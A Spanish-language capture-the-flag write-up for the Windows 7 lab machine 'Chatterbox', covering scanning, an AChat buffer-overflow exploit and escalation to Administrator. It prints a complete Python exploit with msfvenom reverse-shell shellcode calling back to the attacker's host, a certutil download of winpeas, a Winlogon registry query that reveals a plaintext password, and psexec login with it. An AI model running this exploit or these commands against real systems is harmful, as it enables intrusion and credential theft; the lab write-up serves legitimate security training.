# Chatterbox

![](../../../../~gitbook/image.md)Publicado: 10 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
###📝 Descripción
Chatterbox es una máquina de dificultad media que ejecuta Windows 7 Professional. El punto de entrada inicial se realiza a través de un Buffer Overflow en el servicio AChat, una aplicación de chat que se ejecuta en los puertos 9255 y 9256. Después de obtener acceso inicial como el usuario Alfred, la escalada de privilegios se logra mediante credenciales hardcodeadas encontradas en el registro de Windows, específicamente en las claves de Winlogon que almacenan contraseñas de AutoLogon en texto plano.La máquina también presenta una configuración incorrecta de permisos ACL que permite al usuario Alfred acceder directamente al archivo root.txt sin necesidad de escalada completa de privilegios, aunque se demuestra la escalada completa a Administrator utilizando las credenciales encontradas.
###🎯 Objetivos
- User Flag: Obtener acceso inicial y capturar la flag del usuario
- Root Flag: Escalar privilegios a Administrator y obtener la flag final
- Skills: Buffer Overflow, Windows Registry Enumeration, ACL Misconfiguration

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####Escaneo de puertos

####Enumeración de servicios

####445 TCP - SMB
Aunque la sesión anónima está habilitada, no disponemos de permisos para leer ninguno de los recursos compartidos en la máquina sin credenciales:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
####9256 TCP (aChat)
Búsqueda de exploitsBuscamos exploits públicos para esta herramienta y encontramos una explotación de un Buffer Overflow en dos variantes, un script en python y otro para metasploit![](../../../../~gitbook/image.md)💥 Explotación InicialMe decanto por no usar metasploit para esta máquina, así que después de descargar la versión en python, procedo a generar el shellcode usando en este casi un payload de tipo windows/shell_reverse_tcp:Generación de shellcode![](../../../../~gitbook/image.md)Una vez generado, reemplazo el shellcode y la dirección de la máquina víctima en el script en python quedando de esta forma:A continuación inicio un listener usando rlwrap y netcat y obtengo la reverse shell:![](../../../../~gitbook/image.md)
####🔐 Enumeración Post-Explotación
Una vez dentro de la máquina chatterbox obtengo la primera flag en el directorio del usuario Alfred:![](../../../../~gitbook/image.md)Enumeramos como usario Alfred el directorio Administrator de la máquina y vemos que Alfred puede leer incluso el contenido del directorio Desktop. Esto puede ser interesante.Una simple comprobación con la herramienta icacls nos indica que esto es debido a que Alfred tiene permisos full "F" sobre dicho directorio![](../../../../~gitbook/image.md)Una cosa que podemos probar aquí es a asignar permisos a ese directorio para el usuario Alfred usando icacls de la siguiente forma:![](../../../../~gitbook/image.md)Y obtenemos la flag root.txt como usuario Alfred.
####🎪 Escalada de Privilegios Alternativa
Aunque hemos obtenido la flag root.txt en este caso por una mala definición de los permisos acls sobre el fichero root.txt, buscaremos escalar privilegios como usuario Administrador. Para ello enumeramos la máquina en busca de un posible vector:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)No descubrimos tampoco aplicaciones instaladas que puedan ser intereasntes, así qeu Transferimos winpeas.bat al host de windows para automatizar un poco esta fase. Para ello iniciamos un servidor web en python y lo decargamos en el directorio de Alfred usando la herramienta certutil:Una vez ejecutado winpeas sobre la máquina chatterbox, obtenemos una contraseña mediante la consulta de la clave de registro:![](../../../../~gitbook/image.md)El script winpeas obtiene esta información consultado la siguiente clave del registro:![](../../../../~gitbook/image.md)Usamos netexec para verificar estas credenciales con el puerto SMB de la máquina:![](../../../../~gitbook/image.md)Verificamos que se está aplicando una mala praxis a la hora de reutilizar contraseñas y esta contraseña también es válida para la cuenta del usuario Administrator:![](../../../../~gitbook/image.md)Además, verificamos que el usuario Administrator tiene acceso de escritura en algunos recursos compartidos, por lo que podemos usar la herramienta impacket-psexec para autenticarnos en el host usando el puerto 445 del servicio SMB y ganar acceso con máximos privilegios.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🎯 Objetivos](#objetivos)
- [🔭 Reconocimiento](#reconocimiento)

```
❯ ping -c2 10.10.10.74
PING 10.10.10.74 (10.10.10.74) 56(84) bytes of data.
64 bytes from 10.10.10.74: icmp_seq=1 ttl=127 time=46.6 ms
64 bytes from 10.10.10.74: icmp_seq=2 ttl=127 time=41.1 ms

--- 10.10.10.74 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1004ms
rtt min/avg/max/mdev = 41.143/43.877/46.611/2.734 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.74 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
135,139,445,9255,9256,49152,49153,49154,49155,49156,491577
```

```
nmap -sC -sV -p$ports 10.10.10.74 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 14:12 CEST
Nmap scan report for 10.10.10.74
Host is up (0.041s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-title: Site doesn't have a title.
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
|_clock-skew: mean: 6h24m46s, deviation: 2h18m34s, median: 5h04m45s
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-06-10T13:18:31-04:00
| smb2-time:
|   date: 2025-06-10T17:18:32
|_  start_date: 2025-06-10T17:11:49
| smb-security-mode:
|   account_used:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```

```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

```
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x49\x6c\x4b\x38\x74\x42\x79\x70"
buf += b"\x69\x70\x4d\x30\x31\x50\x33\x59\x79\x55\x30\x31"
buf += b"\x67\x50\x42\x44\x54\x4b\x62\x30\x4c\x70\x54\x4b"
buf += b"\x51\x42\x4a\x6c\x32\x6b\x4f\x62\x4c\x54\x74\x4b"
buf += b"\x51\x62\x6c\x68\x6c\x4f\x57\x47\x4e\x6a\x6d\x56"
buf += b"\x4c\x71\x6b\x4f\x74\x6c\x6f\x4c\x6f\x71\x53\x4c"
buf += b"\x4b\x52\x4e\x4c\x6b\x70\x79\x31\x56\x6f\x5a\x6d"
buf += b"\x6b\x51\x57\x57\x58\x62\x4a\x52\x72\x32\x4f\x67"
buf += b"\x64\x4b\x71\x42\x6c\x50\x44\x4b\x50\x4a\x6f\x4c"
buf += b"\x34\x4b\x6e\x6c\x6e\x31\x64\x38\x6a\x43\x61\x38"
buf += b"\x79\x71\x66\x71\x30\x51\x52\x6b\x6f\x69\x6b\x70"
buf += b"\x39\x71\x76\x73\x34\x4b\x6e\x69\x4e\x38\x49\x53"
buf += b"\x6c\x7a\x4d\x79\x74\x4b\x70\x34\x32\x6b\x59\x71"
buf += b"\x57\x66\x4d\x61\x59\x6f\x76\x4c\x45\x71\x78\x4f"
buf += b"\x6a\x6d\x49\x71\x66\x67\x6f\x48\x77\x70\x54\x35"
buf += b"\x4a\x56\x49\x73\x71\x6d\x69\x68\x4d\x6b\x43\x4d"
buf += b"\x6f\x34\x50\x75\x68\x64\x31\x48\x42\x6b\x42\x38"
buf += b"\x6e\x44\x69\x71\x47\x63\x53\x36\x44\x4b\x7a\x6c"
buf += b"\x70\x4b\x62\x6b\x4e\x78\x6b\x6c\x79\x71\x48\x53"
buf += b"\x72\x6b\x59\x74\x64\x4b\x39\x71\x78\x50\x73\x59"
buf += b"\x50\x44\x4e\x44\x4f\x34\x71\x4b\x71\x4b\x33\x31"
buf += b"\x6f\x69\x4e\x7a\x50\x51\x4b\x4f\x69\x50\x4f\x6f"
buf += b"\x61\x4f\x31\x4a\x74\x4b\x6d\x42\x68\x6b\x62\x6d"
buf += b"\x71\x4d\x53\x38\x6c\x73\x4d\x62\x49\x70\x79\x70"
buf += b"\x42\x48\x54\x37\x61\x63\x6f\x42\x71\x4f\x70\x54"
buf += b"\x71\x58\x30\x4c\x72\x57\x4f\x36\x5a\x67\x79\x6f"
buf += b"\x57\x65\x76\x58\x42\x70\x4a\x61\x69\x70\x4d\x30"
buf += b"\x6f\x39\x79\x34\x72\x34\x70\x50\x70\x68\x4f\x39"
buf += b"\x71\x70\x62\x4b\x49\x70\x6b\x4f\x69\x45\x50\x50"
buf += b"\x70\x50\x70\x50\x62\x30\x6d\x70\x62\x30\x4d\x70"
buf += b"\x6e\x70\x30\x68\x39\x5a\x5a\x6f\x67\x6f\x77\x70"
buf += b"\x79\x6f\x76\x75\x35\x47\x62\x4a\x59\x75\x50\x68"
buf += b"\x5a\x6a\x6a\x6a\x4c\x4e\x4d\x37\x51\x58\x5a\x62"
buf += b"\x59\x70\x6d\x31\x75\x6b\x63\x59\x67\x76\x70\x6a"
buf += b"\x4c\x50\x31\x46\x30\x57\x73\x38\x44\x59\x55\x55"
buf += b"\x43\x44\x53\x31\x69\x6f\x56\x75\x72\x65\x79\x30"
buf += b"\x53\x44\x6c\x4c\x39\x6f\x70\x4e\x6c\x48\x34\x35"
buf += b"\x5a\x4c\x72\x48\x7a\x50\x67\x45\x64\x62\x71\x46"
buf += b"\x79\x6f\x49\x45\x6f\x78\x51\x53\x32\x4d\x72\x44"
buf += b"\x59\x70\x74\x49\x7a\x43\x72\x37\x42\x37\x6e\x77"
buf += b"\x6d\x61\x49\x66\x61\x5a\x4d\x42\x30\x59\x70\x56"
buf += b"\x68\x62\x79\x6d\x53\x36\x75\x77\x61\x34\x4d\x54"
buf += b"\x6d\x6c\x6b\x51\x4d\x31\x42\x6d\x6f\x54\x6f\x34"
buf += b"\x6c\x50\x76\x66\x4d\x30\x71\x34\x6e\x74\x6e\x70"
buf += b"\x70\x56\x42\x36\x6f\x66\x70\x46\x4f\x66\x50\x4e"
buf += b"\x30\x56\x71\x46\x4e\x73\x72\x36\x33\x38\x44\x39"
buf += b"\x66\x6c\x4f\x4f\x44\x46\x79\x6f\x78\x55\x54\x49"
buf += b"\x59\x50\x70\x4e\x71\x46\x51\x36\x59\x6f\x4c\x70"
buf += b"\x53\x38\x7a\x68\x73\x57\x6d\x4d\x6f\x70\x49\x6f"
buf += b"\x39\x45\x55\x6b\x68\x70\x75\x65\x56\x42\x4e\x76"
buf += b"\x61\x58\x64\x66\x45\x45\x57\x4d\x35\x4d\x49\x6f"
buf += b"\x4a\x35\x6f\x4c\x7a\x66\x61\x6c\x5a\x6a\x75\x30"
buf += b"\x69\x6b\x39\x50\x42\x55\x5a\x65\x55\x6b\x4f\x57"
buf += b"\x6e\x33\x74\x32\x72\x4f\x70\x6a\x79\x70\x71\x43"
buf += b"\x79\x6f\x76\x75\x41\x41"
```

```
#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x49\x6c\x4b\x38\x74\x42\x79\x70"
buf += b"\x69\x70\x4d\x30\x31\x50\x33\x59\x79\x55\x30\x31"
buf += b"\x67\x50\x42\x44\x54\x4b\x62\x30\x4c\x70\x54\x4b"
buf += b"\x51\x42\x4a\x6c\x32\x6b\x4f\x62\x4c\x54\x74\x4b"
buf += b"\x51\x62\x6c\x68\x6c\x4f\x57\x47\x4e\x6a\x6d\x56"
buf += b"\x4c\x71\x6b\x4f\x74\x6c\x6f\x4c\x6f\x71\x53\x4c"
buf += b"\x4b\x52\x4e\x4c\x6b\x70\x79\x31\x56\x6f\x5a\x6d"
buf += b"\x6b\x51\x57\x57\x58\x62\x4a\x52\x72\x32\x4f\x67"
buf += b"\x64\x4b\x71\x42\x6c\x50\x44\x4b\x50\x4a\x6f\x4c"
buf += b"\x34\x4b\x6e\x6c\x6e\x31\x64\x38\x6a\x43\x61\x38"
buf += b"\x79\x71\x66\x71\x30\x51\x52\x6b\x6f\x69\x6b\x70"
buf += b"\x39\x71\x76\x73\x34\x4b\x6e\x69\x4e\x38\x49\x53"
buf += b"\x6c\x7a\x4d\x79\x74\x4b\x70\x34\x32\x6b\x59\x71"
buf += b"\x57\x66\x4d\x61\x59\x6f\x76\x4c\x45\x71\x78\x4f"
buf += b"\x6a\x6d\x49\x71\x66\x67\x6f\x48\x77\x70\x54\x35"
buf += b"\x4a\x56\x49\x73\x71\x6d\x69\x68\x4d\x6b\x43\x4d"
buf += b"\x6f\x34\x50\x75\x68\x64\x31\x48\x42\x6b\x42\x38"
buf += b"\x6e\x44\x69\x71\x47\x63\x53\x36\x44\x4b\x7a\x6c"
buf += b"\x70\x4b\x62\x6b\x4e\x78\x6b\x6c\x79\x71\x48\x53"
buf += b"\x72\x6b\x59\x74\x64\x4b\x39\x71\x78\x50\x73\x59"
buf += b"\x50\x44\x4e\x44\x4f\x34\x71\x4b\x71\x4b\x33\x31"
buf += b"\x6f\x69\x4e\x7a\x50\x51\x4b\x4f\x69\x50\x4f\x6f"
buf += b"\x61\x4f\x31\x4a\x74\x4b\x6d\x42\x68\x6b\x62\x6d"
buf += b"\x71\x4d\x53\x38\x6c\x73\x4d\x62\x49\x70\x79\x70"
buf += b"\x42\x48\x54\x37\x61\x63\x6f\x42\x71\x4f\x70\x54"
buf += b"\x71\x58\x30\x4c\x72\x57\x4f\x36\x5a\x67\x79\x6f"
buf += b"\x57\x65\x76\x58\x42\x70\x4a\x61\x69\x70\x4d\x30"
buf += b"\x6f\x39\x79\x34\x72\x34\x70\x50\x70\x68\x4f\x39"
buf += b"\x71\x70\x62\x4b\x49\x70\x6b\x4f\x69\x45\x50\x50"
buf += b"\x70\x50\x70\x50\x62\x30\x6d\x70\x62\x30\x4d\x70"
buf += b"\x6e\x70\x30\x68\x39\x5a\x5a\x6f\x67\x6f\x77\x70"
buf += b"\x79\x6f\x76\x75\x35\x47\x62\x4a\x59\x75\x50\x68"
buf += b"\x5a\x6a\x6a\x6a\x4c\x4e\x4d\x37\x51\x58\x5a\x62"
buf += b"\x59\x70\x6d\x31\x75\x6b\x63\x59\x67\x76\x70\x6a"
buf += b"\x4c\x50\x31\x46\x30\x57\x73\x38\x44\x59\x55\x55"
buf += b"\x43\x44\x53\x31\x69\x6f\x56\x75\x72\x65\x79\x30"
buf += b"\x53\x44\x6c\x4c\x39\x6f\x70\x4e\x6c\x48\x34\x35"
buf += b"\x5a\x4c\x72\x48\x7a\x50\x67\x45\x64\x62\x71\x46"
buf += b"\x79\x6f\x49\x45\x6f\x78\x51\x53\x32\x4d\x72\x44"
buf += b"\x59\x70\x74\x49\x7a\x43\x72\x37\x42\x37\x6e\x77"
buf += b"\x6d\x61\x49\x66\x61\x5a\x4d\x42\x30\x59\x70\x56"
buf += b"\x68\x62\x79\x6d\x53\x36\x75\x77\x61\x34\x4d\x54"
buf += b"\x6d\x6c\x6b\x51\x4d\x31\x42\x6d\x6f\x54\x6f\x34"
buf += b"\x6c\x50\x76\x66\x4d\x30\x71\x34\x6e\x74\x6e\x70"
buf += b"\x70\x56\x42\x36\x6f\x66\x70\x46\x4f\x66\x50\x4e"
buf += b"\x30\x56\x71\x46\x4e\x73\x72\x36\x33\x38\x44\x39"
buf += b"\x66\x6c\x4f\x4f\x44\x46\x79\x6f\x78\x55\x54\x49"
buf += b"\x59\x50\x70\x4e\x71\x46\x51\x36\x59\x6f\x4c\x70"
buf += b"\x53\x38\x7a\x68\x73\x57\x6d\x4d\x6f\x70\x49\x6f"
buf += b"\x39\x45\x55\x6b\x68\x70\x75\x65\x56\x42\x4e\x76"
buf += b"\x61\x58\x64\x66\x45\x45\x57\x4d\x35\x4d\x49\x6f"
buf += b"\x4a\x35\x6f\x4c\x7a\x66\x61\x6c\x5a\x6a\x75\x30"
buf += b"\x69\x6b\x39\x50\x42\x55\x5a\x65\x55\x6b\x4f\x57"
buf += b"\x6e\x33\x74\x32\x72\x4f\x70\x6a\x79\x70\x71\x43"
buf += b"\x79\x6f\x76\x75\x41\x41"

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40"
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i 172000:
time.sleep(1.0)
sent = sock.sendto(p[i:(i+8192)], server_address)
i += sent
sock.close()

```

```
rlwrap nc -nlvp 443
```

```
icacls root.txt /grant alfred:F
```

```
whoami /priv
```

```
systeminfo
```

```
C:\Users\Administrator\Desktop>systeminfo
systeminfo

Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          6/10/2025, 1:11:40 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
[01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,691 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,617 MB
Virtual Memory: In Use:    478 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
Hotfix(s):                 183 Hotfix(s) Installed.
[01]: KB2849697
[02]: KB2849696

```

```
net user alfred
```

```
python3 -m http.server 80
certutil -urlcache -split -f http://10.10.14.7/winpeas.bat
winpeas.bat
```

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

```
netexec smb 10.10.10.74 -u 'Alfred' -p 'Welcome1!'
```

```
impacket-psexec Administrator:'Welcome1!'@10.10.10.74
```
